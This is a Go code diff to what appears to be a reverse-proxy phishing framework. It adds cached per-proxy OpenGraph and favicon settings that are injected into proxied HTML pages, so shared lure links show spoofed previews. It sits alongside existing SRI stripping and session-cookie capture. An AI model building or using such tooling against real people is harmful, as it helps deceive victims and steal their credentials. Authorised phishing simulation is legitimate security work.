@@ -127,6 +127,8 @@ type ProxyHandler struct {
 	TelegramService             *service.Telegram
 	ProxyCaptureRepository      *repository.ProxyCapture
 	LiveMapService              *service.LiveMap
+	OpenGraphConfigRepository   *repository.OpenGraphConfig
+	ogConfigCache               sync.Map // cache of proxy ID -> *database.OpenGraphConfig
 	cookieName                  string
 }
 
@@ -148,6 +150,7 @@ func NewProxyHandler(
 	telegramService *service.Telegram,
 	proxyCaptureRepo *repository.ProxyCapture,
 	liveMapService *service.LiveMap,
+	ogConfigRepo *repository.OpenGraphConfig,
 ) *ProxyHandler {
 	// get proxy cookie name from database
 	cookieName := "ps" // fallback default
@@ -155,7 +158,7 @@ func NewProxyHandler(
 		cookieName = opt.Value.String()
 	}
 
-	return &ProxyHandler{
+	handler := &ProxyHandler{
 		logger:                      logger,
 		SessionManager:              sessionManager,
 		PageRepository:              pageRepo,
@@ -173,8 +176,14 @@ func NewProxyHandler(
 		TelegramService:             telegramService,
 		ProxyCaptureRepository:      proxyCaptureRepo,
 		LiveMapService:              liveMapService,
+		OpenGraphConfigRepository:   ogConfigRepo,
 		cookieName:                  cookieName,
 	}
+
+	// preload OpenGraph configs into cache
+	handler.loadOpenGraphConfigs()
+
+	return handler
 }
 
 // HandleHTTPRequest processes incoming http requests through the proxy
@@ -1153,6 +1162,8 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 	// strip SRI integrity attributes from HTML since proxy modifies JS/CSS content
 	if strings.Contains(contentType, "text/html") {
 		body = m.stripSRIAttributes(body)
+		// inject OpenGraph meta tags for link previews
+		body = m.injectOpenGraphTags(body, reqCtx)
 	}
 
 	// build variables context for template interpolation
@@ -1332,6 +1343,8 @@ func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Respo
 	// strip SRI integrity attributes from HTML since proxy modifies JS/CSS content
 	if strings.Contains(contentType, "text/html") {
 		body = m.stripSRIAttributes(body)
+		// inject OpenGraph meta tags for link previews
+		body = m.injectOpenGraphTags(body, reqCtx)
 	}
 
 	body = m.applyCustomReplacementsWithoutSession(body, configMap, reqCtx.TargetDomain, reqCtx.ProxyConfig, contentType)
@@ -5804,4 +5817,150 @@ func (m *ProxyHandler) saveDirectProxyCookieJar(
 			phishDomain,
 		)
 	}
+}
+
+// loadOpenGraphConfigs preloads all OpenGraph configs into the cache.
+func (m *ProxyHandler) loadOpenGraphConfigs() {
+	if m.OpenGraphConfigRepository == nil {
+		return
+	}
+	configs, err := m.OpenGraphConfigRepository.GetAll(context.Background())
+	if err != nil {
+		m.logger.Errorw("failed to load OpenGraph configs", "error", err)
+		return
+	}
+	for i := range configs {
+		if configs[i].ProxyID != nil {
+			m.ogConfigCache.Store(configs[i].ProxyID.String(), &configs[i])
+		}
+	}
+	m.logger.Infow("loaded OpenGraph configs", "count", len(configs))
+}
+
+// ReloadOpenGraphConfigs reloads the OpenGraph config cache (called after API updates).
+func (m *ProxyHandler) ReloadOpenGraphConfigs() {
+	// clear existing cache
+	m.ogConfigCache.Range(func(key, value interface{}) bool {
+		m.ogConfigCache.Delete(key)
+		return true
+	})
+	m.loadOpenGraphConfigs()
+}
+
+// getOpenGraphConfig returns the cached OpenGraph config for a proxy ID.
+func (m *ProxyHandler) getOpenGraphConfig(proxyID *uuid.UUID) *database.OpenGraphConfig {
+	if proxyID == nil {
+		return nil
+	}
+	if val, ok := m.ogConfigCache.Load(proxyID.String()); ok {
+		return val.(*database.OpenGraphConfig)
+	}
+	return nil
+}
+
+// injectOpenGraphTags injects OpenGraph meta tags into the HTML <head> section.
+// This is called during response body rewriting for the initial page load.
+func (m *ProxyHandler) injectOpenGraphTags(body []byte, reqCtx *RequestContext) []byte {
+	if reqCtx.Domain == nil || reqCtx.Domain.ProxyID == nil {
+		return body
+	}
+
+	ogConfig := m.getOpenGraphConfig(reqCtx.Domain.ProxyID)
+	if ogConfig == nil {
+		return body
+	}
+
+	// only inject if at least one OG field is configured
+	if ogConfig.OGTitle == "" && ogConfig.OGDescription == "" && ogConfig.OGImage == "" {
+		return body
+	}
+
+	// build the meta tags
+	var metaTags strings.Builder
+
+	metaTags.WriteString("\n<!-- OpenGraph Meta Tags -->\n")
+
+	if ogConfig.OGTitle != "" {
+		metaTags.WriteString(fmt.Sprintf(`<meta property="og:title" content="%s" />`, htmlEscapeAttr(ogConfig.OGTitle)))
+		metaTags.WriteString("\n")
+		metaTags.WriteString(fmt.Sprintf(`<meta name="twitter:title" content="%s" />`, htmlEscapeAttr(ogConfig.OGTitle)))
+		metaTags.WriteString("\n")
+	}
+
+	if ogConfig.OGDescription != "" {
+		metaTags.WriteString(fmt.Sprintf(`<meta property="og:description" content="%s" />`, htmlEscapeAttr(ogConfig.OGDescription)))
+		metaTags.WriteString("\n")
+		metaTags.WriteString(fmt.Sprintf(`<meta name="description" content="%s" />`, htmlEscapeAttr(ogConfig.OGDescription)))
+		metaTags.WriteString("\n")
+		metaTags.WriteString(fmt.Sprintf(`<meta name="twitter:description" content="%s" />`, htmlEscapeAttr(ogConfig.OGDescription)))
+		metaTags.WriteString("\n")
+	}
+
+	if ogConfig.OGImage != "" {
+		metaTags.WriteString(fmt.Sprintf(`<meta property="og:image" content="%s" />`, htmlEscapeAttr(ogConfig.OGImage)))
+		metaTags.WriteString("\n")
+		metaTags.WriteString(fmt.Sprintf(`<meta name="twitter:image" content="%s" />`, htmlEscapeAttr(ogConfig.OGImage)))
+		metaTags.WriteString("\n")
+	}
+
+	if ogConfig.OGURL != "" {
+		metaTags.WriteString(fmt.Sprintf(`<meta property="og:url" content="%s" />`, htmlEscapeAttr(ogConfig.OGURL)))
+		metaTags.WriteString("\n")
+	}
+
+	if ogConfig.OGType != "" {
+		metaTags.WriteString(fmt.Sprintf(`<meta property="og:type" content="%s" />`, htmlEscapeAttr(ogConfig.OGType)))
+		metaTags.WriteString("\n")
+	}
+
+	if ogConfig.OGSiteName != "" {
+		metaTags.WriteString(fmt.Sprintf(`<meta property="og:site_name" content="%s" />`, htmlEscapeAttr(ogConfig.OGSiteName)))
+		metaTags.WriteString("\n")
+	}
+
+	if ogConfig.TwitterCard != "" {
+		metaTags.WriteString(fmt.Sprintf(`<meta name="twitter:card" content="%s" />`, htmlEscapeAttr(ogConfig.TwitterCard)))
+		metaTags.WriteString("\n")
+	}
+
+	if ogConfig.Favicon != "" {
+		metaTags.WriteString(fmt.Sprintf(`<link rel="icon" href="%s" />`, htmlEscapeAttr(ogConfig.Favicon)))
+		metaTags.WriteString("\n")
+		metaTags.WriteString(fmt.Sprintf(`<link rel="shortcut icon" href="%s" />`, htmlEscapeAttr(ogConfig.Favicon)))
+		metaTags.WriteString("\n")
+	}
+
+	metaTags.WriteString("<!-- End OpenGraph Meta Tags -->\n")
+
+	bodyStr := string(body)
+
+	// try to inject after <head> tag
+	headIdx := strings.Index(strings.ToLower(bodyStr), "<head>")
+	if headIdx != -1 {
+		// find the end of the <head> tag
+		insertPos := headIdx + 6 // length of "<head>"
+		return []byte(bodyStr[:insertPos] + metaTags.String() + bodyStr[insertPos:])
+	}
+
+	// try <head with attributes
+	headIdx = strings.Index(strings.ToLower(bodyStr), "<head ")
+	if headIdx != -1 {
+		// find the closing >
+		closeIdx := strings.Index(bodyStr[headIdx:], ">")
+		if closeIdx != -1 {
+			insertPos := headIdx + closeIdx + 1
+			return []byte(bodyStr[:insertPos] + metaTags.String() + bodyStr[insertPos:])
+		}
+	}
+
+	return body
+}
+
+// htmlEscapeAttr escapes special characters for use in HTML attribute values.
+func htmlEscapeAttr(s string) string {
+	s = strings.ReplaceAll(s, "&", "&amp;")
+	s = strings.ReplaceAll(s, "\"", "&quot;")
+	s = strings.ReplaceAll(s, "<", "&lt;")
+	s = strings.ReplaceAll(s, ">", "&gt;")
+	return s
 }
